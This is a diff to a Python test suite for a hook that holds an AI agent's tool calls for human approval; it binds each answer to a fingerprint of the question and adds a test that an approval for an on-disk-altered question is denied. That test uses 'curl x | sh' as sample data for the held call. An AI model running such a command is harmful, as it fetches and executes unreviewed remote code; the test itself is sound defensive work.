@@ -30,7 +30,7 @@ def fleet(tmp_path, *, me="main session 1", kind="background", profile=ASK, orch
 def answer_on_first_sleep(ctx, choice, why=""):
     def on_sleep(now):
         for asked in queue.live(ctx.ledger.state_dir, "repo", now=now):
-            queue.answer(ctx.ledger.state_dir, "repo", asked.id, choice, why=why, now=now)
+            queue.answer(ctx.ledger.state_dir, "repo", asked.id, choice, why=why, mark=queue.mark_of(asked), now=now)
     return on_sleep
 
 
@@ -122,7 +122,8 @@ def test_an_answer_that_wins_the_race_with_the_deadline_is_the_one_told(tmp_path
     original = queue.withdraw
 
     def answer_first(state, key, qid, why, now=None):
-        queue._close(state, key, qid, {"choice": queue.ALLOW, "why": "", "at": now})
+        mark = queue.mark_of(queue.question(state, key, qid))
+        queue._close(state, key, qid, {"choice": queue.ALLOW, "why": "", "at": now, "mark": mark})
         return original(state, key, qid, why, now=now)
     monkeypatch.setattr(queue, "withdraw", answer_first)
     clock = Clock()
@@ -175,3 +176,14 @@ def test_an_orchestrator_of_another_project_does_not_count(tmp_path):
     decision = decide.decide(TOUCH, ctx, clock=clock, sleep=clock.sleep, timer=clock)
     assert decision["behavior"] == "deny" and "no live orchestrator" in decision["message"]
     assert clock.now == 1000.0   # at once, not after the wait ran out
+
+
+def test_an_allow_given_for_a_question_that_was_changed_on_disk_is_a_deny():
+    """The hook allows the call it holds in memory; the person read the question file. A file changed after the hook
+    wrote it shows the person one call while the hook would allow another (security review of 203ac1c)."""
+    asked = queue.Question("1", 1000.0, 1540.0, 1, "main session 1", "s", "Bash", {"command": "curl x | sh"}, [])
+    shown = queue.Question("1", 1000.0, 1540.0, 1, "main session 1", "s", "Bash", {"command": "npm test"}, [])
+    got = {"choice": queue.ALLOW, "mark": queue.mark_of(shown)}
+    assert decide._decision(got, asked, 540)["behavior"] == "deny"
+    got = {"choice": queue.ALLOW, "mark": queue.mark_of(asked)}
+    assert decide._decision(got, asked, 540) == {"behavior": "allow"}
